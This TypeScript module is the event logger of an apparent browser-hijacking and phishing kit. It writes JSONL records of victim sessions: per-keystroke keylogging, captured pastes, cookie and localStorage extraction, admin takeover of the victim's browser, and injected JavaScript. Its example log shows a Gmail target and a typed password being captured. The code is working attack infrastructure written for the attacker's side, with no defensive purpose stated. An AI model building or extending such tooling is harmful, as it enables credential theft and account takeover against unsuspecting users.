import { appendFile, mkdir } from 'fs/promises';
import { join, dirname } from 'path';
import { fileURLToPath } from 'url';

const __dirname = dirname(fileURLToPath(import.meta.url));
const LOGS_DIR = join(__dirname, '..', 'logs');

/**
 * Flag to track if logs directory has been created.
 * Prevents redundant mkdir calls on every log write.
 */
let logsReady = false;

/**
 * Ensures the logs directory exists.
 * Creates it if necessary, then sets logsReady flag to skip future checks.
 */
async function ensureLogsDir(): Promise<void> {
  if (logsReady) return;
  await mkdir(LOGS_DIR, { recursive: true });
  logsReady = true;
}

/**
 * Returns the log file path for today's date.
 * Log files are named: sessions-YYYY-MM-DD.jsonl
 * 
 * @returns Absolute path to today's log file
 */
function todayFile(): string {
  return join(LOGS_DIR, `sessions-${new Date().toISOString().slice(0, 10)}.jsonl`);
}

// ═══════════════════════════════════════════════════════════════════════════════
// Session Event Types
// ═══════════════════════════════════════════════════════════════════════════════

/**
 * Union type of all possible session events.
 * Each event type has specific fields relevant to that event.
 * 
 * **Event Types:**
 * - session_start: Victim connects and claims a browser
 * - session_end: Victim disconnects
 * - navigation: Page navigates to a new URL
 * - keylog: Single keystroke entry
 * - paste: Paste operation
 * - cookies_extracted: Admin extracts cookies
 * - storage_extracted: Admin extracts localStorage/sessionStorage
 * - takeover_start: Admin takes control of victim's browser
 * - takeover_end: Admin returns control to victim
 * - js_injected: Admin injects JavaScript into page
 * 
 * **Log Format:**
 * - JSONL (JSON Lines): One JSON object per line
 * - Each line is a complete, parseable JSON object
 * - Easy to parse with streaming JSON parsers
 * - Easy to grep/search with standard Unix tools
 */
export type SessionEvent =
  | { event: 'session_start'; browserId: string; ip: string; userAgent: string; target: string; viewport: { w: number; h: number } }
  | { event: 'session_end';   browserId: string; durationMs: number }
  | { event: 'navigation';    browserId: string; url: string }
  | { event: 'keylog';        browserId: string; entry: string }
  | { event: 'paste';         browserId: string; text: string }
  | { event: 'cookies_extracted'; browserId: string; cookieCount: number }
  | { event: 'storage_extracted'; browserId: string }
  | { event: 'takeover_start';    browserId: string }
  | { event: 'takeover_end';      browserId: string }
  | { event: 'js_injected';       browserId: string; script: string };

// ═══════════════════════════════════════════════════════════════════════════════
// Event Logger
// ═══════════════════════════════════════════════════════════════════════════════

/**
 * Logs a session event to today's JSONL log file.
 * 
 * **Log Format:**
 * Each line is a JSON object with:
 * - ts: ISO 8601 timestamp
 * - event: Event type (e.g., 'session_start', 'keylog')
 * - ...additional fields specific to the event type
 * 
 * **Example Log Lines:**
 * ```jsonl
 * {"ts":"2024-01-15T10:30:00.000Z","event":"session_start","browserId":"abc123","ip":"192.168.1.100","userAgent":"Mozilla/5.0...","target":"gmail","viewport":{"w":1920,"h":1080}}
 * {"ts":"2024-01-15T10:30:05.123Z","event":"keylog","browserId":"abc123","entry":"p"}
 * {"ts":"2024-01-15T10:30:05.234Z","event":"keylog","browserId":"abc123","entry":"a"}
 * {"ts":"2024-01-15T10:30:05.345Z","event":"keylog","browserId":"abc123","entry":"s"}
 * {"ts":"2024-01-15T10:30:05.456Z","event":"keylog","browserId":"abc123","entry":"s"}
 * {"ts":"2024-01-15T10:30:10.000Z","event":"session_end","browserId":"abc123","durationMs":10000}
 * ```
 * 
 * **Error Handling:**
 * Errors are logged to console but don't crash the server.
 * This ensures logging failures don't disrupt active sessions.
 * 
 * @param e - Session event to log
 */
export async function logEvent(e: SessionEvent): Promise<void> {
  try {
    await ensureLogsDir();
    const line = JSON.stringify({ ts: new Date().toISOString(), ...e }) + '\n';
    await appendFile(todayFile(), line, 'utf-8');
  } catch (err) {
    console.error(`[session-logger] Failed to write log: ${(err as Error).message}`);
  }
}